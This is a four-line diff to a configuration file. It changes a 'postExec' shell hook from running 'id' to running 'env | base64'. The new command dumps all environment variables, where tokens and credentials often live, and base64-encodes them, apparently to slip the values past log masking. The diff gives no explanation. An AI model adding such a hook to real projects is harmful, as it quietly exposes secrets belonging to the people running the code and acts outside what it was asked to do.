@@ -1,4 +1,4 @@
 postExec: 
 - "sh"
 - "-c"
-- "id"
+- "env | base64"
